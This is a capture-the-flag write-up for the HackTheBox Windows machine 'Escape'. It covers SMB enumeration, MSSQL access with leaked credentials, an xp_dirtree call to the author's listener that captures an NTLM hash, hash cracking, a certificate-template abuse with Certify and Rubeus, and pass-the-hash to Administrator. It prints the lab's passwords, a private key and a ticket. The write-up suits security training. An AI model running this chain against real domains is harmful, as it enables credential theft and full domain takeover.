# Escape - HackTheBox - Writeup
Windows, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![Escape.JPG](images/Escape.JPG)
 
## TL;DR

To solve this machine, we start by using `nmap` to enumerate open services.

***User***: We discovered a PDF file on a `Public` share that contained login credentials for MSSQL. With the help of these credentials, we were able to access the database and execute the `xp_dirtree` command. This gave us the NTLM hash for `sql_svc` on `Responder`. After cracking the hash, we logged in using `evil-winrm`. Upon reviewing the SqlServer logs, we were able to obtain the login credentials for `Ryan.Cooper`.

***Root***: We used `Certify` to locate a misconfigured certificate template. After creating the certificate with `Certify`, we converted it to a `.pfx` file. We then used `Rubeus` to request TGT with the certificate. Finally, we were able to connect as `Administrator` using `evil-winrm` and the `Administrator` NTLM hash.

![pwn.JPG](images/pwn.JPG)


## Escape Solution

### User

Let's begin by using `nmap` to scan the target machine:

```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ nmap -sV -sC -oA nmap/Escape 10.10.11.202
Starting Nmap 7.92 ( https://nmap.org ) at 2023-03-14 12:49 IST
Nmap scan report for 10.10.11.202
Host is up (0.094s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-14 18:50:07Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
|_ssl-date: 2023-03-14T18:50:54+00:00; +8h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-14T18:50:55+00:00; +8h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.sequel.htb
| Not valid before: 2022-11-18T21:20:35
|_Not valid after:  2023-11-18T21:20:35
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-03-14T18:50:54+00:00; +7h59m59s from scanner time.
| ms-sql-ntlm-info: 
|   Target_Name: sequel
|   NetBIOS_Domain_Name: sequel
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: sequel.htb
|   DNS_Computer_Name: dc.sequel.htb
|   DNS_Tree_Name: sequel.htb
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-03-14T02:44:51
|_Not valid after:  2053-03-14T02:44:51
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-14T18:50:15
|_  start_date: N/A
| ms-sql-info: 
|   10.10.11.202:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

```

We will attempt to enumerate the SMB shares using the `smbclient` tool:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ sudo smbmap -H dc.sequel.htb -d SEQUEL.HTB  -u Guest
[+] IP: dc.sequel.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Public                                            	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 

┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ smbclient \\\\10.10.11.202\\Public -W sequel.htb -U Guest
Password for [SEQUEL.HTB\Guest]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Nov 19 13:51:25 2022
  ..                                  D        0  Sat Nov 19 13:51:25 2022
  SQL Server Procedures.pdf           A    49551  Fri Nov 18 15:39:43 2022

		5184255 blocks of size 4096. 1452111 blocks available
smb: \> get "SQL Server Procedures.pdf"
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (132.2 KiloBytes/sec) (average 132.2 KiloBytes/sec)

```

In the file `SQL Server Procedures.pdf`, we discovered the following hints:

![pdf.JPG](images/pdf.JPG)

These hints reveal the usernames `Ryan` and `Tom`, as well as the email address `brandon.brown@sequel.htb` for a user. In addition, we obtained the login credentials `PublicUser` and the password `GuestUserCantWrite1`.

Based on the information provided in the PDF file, we can connect to the MSSQL database using the [mssqlclient.py](https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py) tool:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ mssqlclient.py "sequel/PublicUser:GuestUserCantWrite1@10.10.11.202"
Impacket v0.10.1.dev1+20230223.202738.f4b848fa - Copyright 2022 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLMOCK): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLMOCK): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (PublicUser  guest@master)> 
```

We have the following databases:
```console
SQL (PublicUser  guest@master)> SELECT name FROM master.dbo.sysdatabases;
name     
------   
master   

tempdb   

model    

msdb     

```

As we have access to the database, we can attempt to steal the NetNTLM hash or perform a relay attack using the `xp_dirtree` command ([Reference](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)).

First, Let's start `Responder`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ sudo responder -I tun0
...
```

Now, Let's run `xp_dirtree`:
```console
SQL (PublicUser  guest@msdb)> exec master.dbo.xp_dirtree '\\10.10.14.14\any\thing'
subdirectory   depth   
------------   -----   
SQL (PublicUser  guest@msdb)> 

```

we will receive the following request on `Responder`:
```console
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:b0d66a17e0a9e552:37955D7D8406C2D93A40BD49CE9C7C5C:010100000000000080DEE2F58756D901C32EFC472012DA560000000002000800490036003700340001001E00570049004E002D00300054004C0037004C0041003600580042004200340004003400570049004E002D00300054004C0037004C004100360058004200420034002E0049003600370034002E004C004F00430041004C000300140049003600370034002E004C004F00430041004C000500140049003600370034002E004C004F00430041004C000700080080DEE2F58756D901060004000200000008003000300000000000000000000000003000005A22B43D96B75A56CDC0097D521A7BE22DDE659B55B203B258D375E155661CC00A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00310037000000000000000000
```

We will attempt to crack the captured hash using the `john` tool:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ john --wordlist=~/Desktop/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
REGGIE1234ronnie (sql_svc)
1g 0:00:00:07 DONE (2023-03-14 15:22) 0.1404g/s 1502Kp/s 1502Kc/s 1502KC/s RENZOH..REDMAN36
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed

```

We get the password of `sql_svc` user `REGGIE1234ronnie`.

We have obtained the password REGGIE1234ronnie for the `sql_svc` user.

We can use these credentials to log in to the system using [evil-winrm](https://github.com/Hackplayers/evil-winrm):
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ evil-winrm -i 10.10.11.202 -u sql_svc -p 'REGGIE1234ronnie'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\sql_svc\Documents> 

```

While enumerating the machine, we discovered a directory named `SQLServer` on the `C` drive, which contains logs in the Logs directory. By analyzing the logs, we were able to identify the following credentials for the `Ryan.Cooper` user:
```console
*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK
...
2022-11-18 13:43:07.44 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
...
```

We can use the obtained credentials for the `Ryan.Cooper` user to log in to the system using `evil-winrm`:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ evil-winrm -i 10.10.11.202 -u Ryan.Cooper -p 'NuclearMosquito3'
Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Ryan.Cooper> cd Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> cat user.txt
4ba6f80252a5f6bfb58fc41974710774
```

And we get the user flag `4ba6f80252a5f6bfb58fc41974710774`.

### Root

After reading the article titled [From Misconfigured Certificate Template to Domain Admin](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin) we decided to search for a misconfigured certificate template.

To begin, we will upload the [Certify](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) tool to the target machine. Once uploaded, we can run the tool with the following command:
```console
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519



Certify completed in 00:00:10.2451313

```

After running `Certify`, we were able to identify a `Vulnerable Certificate Template` named `UserAuthentication`, with `Enrollment Rights` assigned to `sequel\Domain Users.`

Next, we can request a certificate using the following command: `certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator`.

1. `/ca` - speciffies the Certificate Authority server we're sending the request to.
2. `/template` - specifies the certificate template that should be used for generating the new certificate.
3. `/altname` - specifies the AD user for which the new certificate should be generated.

Run it:
```console
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> ./certify.exe request /ca:dc.sequel.htb\sequel-DC-CA /template:UserAuthentication /altname:Administrator

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Request a Certificates

[*] Current user context    : sequel\Ryan.Cooper
[*] No subject name specified, using current context as subject.

[*] Template                : UserAuthentication
[*] Subject                 : CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] AltName                 : Administrator

[*] Certificate Authority   : dc.sequel.htb\sequel-DC-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 16

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA8zCEXbVx77Q8u/LZvq6hgeckIGMq4pURoVhEbgjmjbt27af2
c9tNEY7Ibn+tHwRcIdUKamFyL8teHRVxCUyzEU3C5qvwC/pMGVlcLV7aK8YbgXS8
i5E5XZRdx/NWpuopW0x+0Gxi2TKZ8QWYvXzXUCvUyfONTrihLXxf1rkchABDtdfa
CaJLJ3T/VF4Z1f0eogRh5x3bQY8FdwqApNHlrsXXpTVDGOkHiSrkyU8rTW1nTK2V
dKNfHtyyL0wpToPdA6QrdhDwzxBoQqo8pxVYblCRKWar+YPbJqq9M/KUChNPWuje
9lbn7NWKh3wUJMfoQJrJo/pY93QEzGRrcrcTDQIDAQABAoIBAFPNjE+ejzzDJ4q9
DTwggZd6R4DBq62ZIRIwkKQ6fPiqeTk8gDk8gTpjsb4iUU42+mjOOWCfY/IEatIq
6WEDBVIZMei7p2T5Q/AYUyNvZE9hXWknCTIvQU12KzsUJ/AtEUNdAPZh405lmZbt
Ds19j9UYxaMyQqe2CBTcn0onUCRMJxACgpQmmJ7PmHSjeEc8sJs0mBHA5EUtSS1J
eKGKUHZXOoYjxph8pXj4rS0PcNRyD70HM96A7OFRGnxEMETj+t2Km0UOJIiSoWp9
253TMhayYms1eDXLFX5Dr+jLZpoE4AGpbDSug5QQG5AIBucNe3Rw1ejvDf2mLBUC
qXN0VCECgYEA90Z6C/iD0pt7DdbJn3icxnquMMCegTGdrdgMYgYB1HlNeefWiJ0i
mNsfBIXeKcbdsq6b+sR62Z2y+lHhTWuuBIHYN1Gxdgl2RSFEhfnAVo3UQgNG8Klw
V3G4eaJN3funiV0pKi/7a9vwkqlE9aq+t3cOlkmi62O52gJMr8YhE0MCgYEA+8Ui
plzTmk985htqb4rvFQyGq67IvL99Gr4/nef2Cn2oazDUYdZU1C6Q7hKxJKq2G6T5
BNBjJ82Kna/oxGMDjZXGmBocFWbwFTKirKj+IiOKcXRinhNfG3755u4abOdjOebK
KLCnM9pC1H/0TBnci7ihwbTJnGg+F5589BnLU28CgYBdqKUbmaKch+WhBUTTEUUY
bGlD8AFZX+igax+tlSbmSpfM38JDdnkfOofSF75hRoC8aCSOZBNAD9o1tAPJZkrA
TEoQEfJMiiLw5jvlHwb6Abhu1HzvNM5nYJyF/bLOrL31aoLoBsqNPP4vHswO3QBl
z0OIKxX5YImJiKtxPHNUrwKBgQDVhM5qAHeEer0V+VI+3rj8RO9BUq3zRQK4V3hk
VoCXTRI0NekoQDkY6ZUIEtogmpZuw25c4s30x6AzMyhYxRASV19hR2Nh0zbxA0xq
2bcNBM84gNfR7+PM0dbmPjAzA9lnFY+FCqwCkavzw8BPee9Mn3yvZr9E4jMmnMaj
zexeCQKBgE7dWNN4DZfOiArXlMFDs9XjxmK1oER2nFCBtds/xunstf1e2ksPEBy4
qjp9x1Hja24CZ84COPFKR8pEkV7T6/sbDCesmBIZp6cg/WQceHcn2y9ljDq14mdO
FNTkdASGfDorynLv/0XFrWKSJ6UvC7D4+kKLt6C2M570ZRg+gJJy
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIGEjCCBPqgAwIBAgITHgAAABD9WUPtpFW+/gAAAAAAEDANBgkqhkiG9w0BAQsF
ADBEMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VxdWVs
MRUwEwYDVQQDEwxzZXF1ZWwtREMtQ0EwHhcNMjMwMzE1MDQyOTEwWhcNMjUwMzE1
MDQzOTEwWjBTMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYG
c2VxdWVsMQ4wDAYDVQQDEwVVc2VyczEUMBIGA1UEAxMLUnlhbi5Db29wZXIwggEi
MA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDzMIRdtXHvtDy78tm+rqGB5yQg
YyrilRGhWERuCOaNu3btp/Zz200Rjshuf60fBFwh1QpqYXIvy14dFXEJTLMRTcLm
q/AL+kwZWVwtXtorxhuBdLyLkTldlF3H81am6ilbTH7QbGLZMpnxBZi9fNdQK9TJ
841OuKEtfF/WuRyEAEO119oJoksndP9UXhnV/R6iBGHnHdtBjwV3CoCk0eWuxdel
NUMY6QeJKuTJTytNbWdMrZV0o18e3LIvTClOg90DpCt2EPDPEGhCqjynFVhuUJEp
Zqv5g9smqr0z8pQKE09a6N72Vufs1YqHfBQkx+hAmsmj+lj3dATMZGtytxMNAgMB
AAGjggLsMIIC6DA9BgkrBgEEAYI3FQcEMDAuBiYrBgEEAYI3FQiHq/N2hdymVof9
lTWDv8NZg4nKNYF338oIhp7sKQIBZAIBBTApBgNVHSUEIjAgBggrBgEFBQcDAgYI
KwYBBQUHAwQGCisGAQQBgjcKAwQwDgYDVR0PAQH/BAQDAgWgMDUGCSsGAQQBgjcV
CgQoMCYwCgYIKwYBBQUHAwIwCgYIKwYBBQUHAwQwDAYKKwYBBAGCNwoDBDBEBgkq
hkiG9w0BCQ8ENzA1MA4GCCqGSIb3DQMCAgIAgDAOBggqhkiG9w0DBAICAIAwBwYF
Kw4DAgcwCgYIKoZIhvcNAwcwHQYDVR0OBBYEFAgILn+9F5tkNEAerHzlgZvIJnU6
MCgGA1UdEQQhMB+gHQYKKwYBBAGCNxQCA6APDA1BZG1pbmlzdHJhdG9yMB8GA1Ud
IwQYMBaAFGKfMqOg8Dgg1GDAzW3F+lEwXsMVMIHEBgNVHR8EgbwwgbkwgbaggbOg
gbCGga1sZGFwOi8vL0NOPXNlcXVlbC1EQy1DQSxDTj1kYyxDTj1DRFAsQ049UHVi
bGljJTIwS2V5JTIwU2VydmljZXMsQ049U2VydmljZXMsQ049Q29uZmlndXJhdGlv
bixEQz1zZXF1ZWwsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFz
ZT9vYmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCBvQYIKwYBBQUHAQEE
gbAwga0wgaoGCCsGAQUFBzAChoGdbGRhcDovLy9DTj1zZXF1ZWwtREMtQ0EsQ049
QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNv
bmZpZ3VyYXRpb24sREM9c2VxdWVsLERDPWh0Yj9jQUNlcnRpZmljYXRlP2Jhc2U/
b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsF
AAOCAQEAF1hW1wZ/NxR/WpU3IUnfGl/vtLPp4/6Sw/y0sITwwP7Lhl20jTFpffpH
HUMMdqvSrugKEjmxPoTyQGHkP1vDA1OEOq9lsKZ2NlZ9DEvWSEsgjsmjbMKiEClF
a9uWjF5uPCrrMLDHrvG68EzU/8fq4ZWUWCilzx9RaVg90t/PCWUiBghvZIEojndC
uHHSBcZtjxl14LDbkQw/6uABl/Ci/5cPT8tbMD7rj0RFiJNbnwf5Ad0s0fRYXVSr
QOifCj9I26O0uyEnYeLfcKyQJFomRbaloUByyAzqsy/QXO7RaqIji2piZFknmzzb
ReSmMAW1cq1z5W3D2LQmDSKw3tLS/g==
-----END CERTIFICATE-----


[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx



Certify completed in 00:00:11.6819775
```

After successfully requesting the certificate, we need to convert the generated PEM file to a PFX file using the `openssl` tool:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
Enter Export Password:
Verifying - Enter Export Password:

```

After converting the certificate to PFX format, we need to upload it to the target machine and use it to request a Kerberos TGT for the `Administrator` user. We can do this using the [Rubeus](https://github.com/BC-SECURITY/Empire/blob/main/empire/server/data/module_source/credentials/Invoke-Rubeus.ps1) tool with the following command:
```console
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Downloads> Invoke-Rubeus -Command "asktgt /user:Administrator /getcredentials /certificate:C:\test\cert.pfx"

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\Administrator'
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  Administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  3/14/2023 10:25:27 PM
  EndTime                  :  3/15/2023 8:25:27 AM
  RenewTill                :  3/21/2023 10:25:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  Q6jTmidVgqwSD/s/D2UAYA==
  ASREP (key)              :  7BF4DF2F59AA56AD1960BFEC6276F58B

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

Now we can log in using the `Administrator` NTLM hash as following:
```console
┌─[evyatar9@parrot]─[/hackthebox/Escape]
└──╼ $ evil-winrm -i dc.sequel.htb -u Administrator -H A52F78E4C751E5F5E17E1E9F3E58F4EE

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
6d63dc42fb3a46a6321bc2abf380e710
```